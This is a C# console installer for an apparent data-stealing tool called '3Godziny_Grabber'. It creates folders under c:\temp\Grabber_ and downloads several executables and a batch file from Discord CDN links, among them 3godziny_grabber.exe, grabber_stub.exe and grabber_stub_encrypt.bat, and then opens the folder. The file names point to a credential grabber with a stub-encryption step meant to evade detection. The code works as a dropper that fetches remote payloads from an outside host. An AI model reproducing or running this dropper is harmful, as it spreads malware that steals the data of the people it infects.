
using System;
using System.IO;
using System.Net;
using static System.Net.Mime.MediaTypeNames;

namespace Grabb_instal
{

    class Program
    {

        static void Main(string[] args)
        {
            temp();
            Folder();
            



            Console.BackgroundColor = ConsoleColor.Black;
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("3Godziny_Grabber");
            Console.WriteLine("______________________________");
            Console.WriteLine("Insatl/Create folders and file ...  -> :c/temp/Grabber_");
            Console.WriteLine("______________________________");
            Console.WriteLine("MachineName: {0}", Environment.MachineName);
            Console.ResetColor();
            Console.BackgroundColor = ConsoleColor.Black;
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine();
            Console.WriteLine("Finished");
            Console.WriteLine();
            Console.ResetColor();
            Console.BackgroundColor = ConsoleColor.Black;
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("Click 'X' to close instaler");
            Console.WriteLine("______________________________");

        
            Console.Write("close...");

           


            end();


        }
        static void end()
        {
            Console.ReadKey();
        }
        
        static void temp()
        {
            DirectoryInfo di = new DirectoryInfo(@"c:\temp");
            if (di.Exists)
            {
                Console.BackgroundColor = ConsoleColor.Black;
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("temp = Exists");
                Console.ResetColor();
                Console.WriteLine();
            }else if(di.Exists == false)
            {
                Console.BackgroundColor = ConsoleColor.Black;
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("temp = does not exist");
                Console.ResetColor();
                Console.BackgroundColor = ConsoleColor.Black;
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("------------------------------------");
                Console.WriteLine("temp = was created");
                Console.WriteLine("------------------------------------");
                Console.ResetColor();
                Console.WriteLine();
                string folderName = @"c:\temp";
            }
        }
        static void Folder()
        {
            // string newFolder = "_Grabber_";

            // string folderPath = System.IO.Path.Combine(
            //   Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            //   newFolder

            // );

            //if (!System.IO.Directory.Exists(folderPath))
            // {
            //     try
            //    {
            //        System.IO.Directory.CreateDirectory(folderPath);
            //        Directory.CreateDirectory(folderPath);
            //        Console.BackgroundColor = ConsoleColor.Black;
            //        Console.ForegroundColor = ConsoleColor.Green;
            //        Console.WriteLine(folderPath);
            //        Console.ResetColor();
            //         Console.WriteLine();
            //     }
            //     catch (IOException ie)
            //     {
            //         Console.WriteLine("IO Error: " + ie.Message);
            //     }
            //      catch (Exception e)
            //      {
            //          Console.WriteLine("General Error: " + e.Message);
            //      }
            // }

            Folder2();
            Console.WriteLine("------------------------------------");
            Console.WriteLine("Folder1_Build");

        }
        static void Folder2()
        {
            string folderPath = @"c:\temp\Grabber_";
            if (!Directory.Exists(folderPath))
            {
                Directory.CreateDirectory(folderPath);
                Console.BackgroundColor = ConsoleColor.Black;
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(folderPath);
                Console.ResetColor();
                Console.WriteLine();
            }
            Folder3();
            Console.WriteLine("------------------------------------");
            Console.WriteLine("Folder2_Build");
        }
        static void Folder3()
        {
            string folderPath = @"c:\temp\Grabber_\Config";
            if (!Directory.Exists(folderPath))
            {
                Directory.CreateDirectory(folderPath);
                Console.BackgroundColor = ConsoleColor.Black;
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(folderPath);
                Console.ResetColor();
                Console.WriteLine();
            }
            Folder4();
            Console.WriteLine("------------------------------------");
            Console.WriteLine("Folder3_Build");
        }
        static void Folder4()
        {
            string folderPath = @"c:\temp\Grabber_\Build";
            if (!Directory.Exists(folderPath))
            {
                Directory.CreateDirectory(folderPath);
                Console.BackgroundColor = ConsoleColor.Black;
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(folderPath);
                Console.ResetColor();
                Console.WriteLine();
            }
            Folder5();
            Console.WriteLine("------------------------------------");
            Console.WriteLine("Folder4_Build");
        }
        static void Folder5()
        {
            string folderPath = @"c:\temp\Grabber_\Apps";
            if (!Directory.Exists(folderPath))
            {
                Directory.CreateDirectory(folderPath);
                Console.BackgroundColor = ConsoleColor.Black;
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(folderPath);
                Console.ResetColor();
                Console.WriteLine();
            }
            Console.WriteLine("------------------------------------");
            Console.WriteLine("Folder5_Build");
            Dow1();
            Dow2();
            Dow3();
            dow4();
            dow5();
            Config();
        }
        static void Dow1()
        {
            WebClient webClient = new WebClient();
            Uri assetLoader = new Uri("https://cdn.discordapp.com/attachments/1025066854089228302/1028633705343885392/3godziny_grabber.exe", UriKind.Absolute);
            webClient.DownloadFile(assetLoader, @"c:\temp\Grabber_\3godziny_grabber.exe");
            Console.WriteLine("------------------------------------");
            Console.WriteLine("Download_file1");
        }
        static void Dow2()
        {
            WebClient webClient = new WebClient();
            Uri assetLoader = new Uri("https://cdn.discordapp.com/attachments/1025066854089228302/1028633705343885392/3godziny_grabber.exe", UriKind.Absolute);
            webClient.DownloadFile(assetLoader, @"c:\temp\Grabber_\Build\3godziny_grabber.exe");
            Console.WriteLine("------------------------------------");
            Console.WriteLine("Download_file2");
        }
        static void Dow3()
        {
            WebClient webClient = new WebClient();
            Uri assetLoader = new Uri("https://cdn.discordapp.com/attachments/1027305907811516548/1027984620207222844/Grabb_instal.exe", UriKind.Absolute);
            webClient.DownloadFile(assetLoader, @"c:\temp\Grabber_\Apps\Grabb_instal.exe");
            Console.WriteLine("------------------------------------");
            Console.WriteLine("Download_file3");
        }
        static void dow4()
        {
            WebClient webClient = new WebClient();
            Uri assetLoader = new Uri("https://cdn.discordapp.com/attachments/1028439008247816305/1028639345139257414/grabber_stub.exe", UriKind.Absolute);
            webClient.DownloadFile(assetLoader, @"c:\temp\Grabber_\Config\grabber_stub.exe");
            Console.WriteLine("------------------------------------");
            Console.WriteLine("Download_file4");
        }
        static void dow5()
        {
            WebClient webClient = new WebClient();
            Uri assetLoader = new Uri("https://cdn.discordapp.com/attachments/1028439008247816305/1028639520847048724/grabber_stub_encrypt.bat", UriKind.Absolute);
            webClient.DownloadFile(assetLoader, @"c:\temp\Grabber_\Config\grabber_stub_encrypt.bat");
            Console.WriteLine("------------------------------------");
            Console.WriteLine("Download_file5");
        }
        static void Config()
        {
            WebClient webClient = new WebClient();
            Uri assetLoader = new Uri("https://cdn.discordapp.com/attachments/1027305907811516548/1027985392789626941/program.config", UriKind.Absolute);
            webClient.DownloadFile(assetLoader, @"c:\temp\Grabber_\Config\program.config");
            Console.WriteLine("------------------------------------");
            Console.WriteLine("Create file ( config )");
            copy();

            open();

        }
       
        static void open()
        {
            System.Diagnostics.Process.Start("explorer.exe", @"c:\temp\Grabber_");
        }
        static void copy()
        {









        }


    }
}
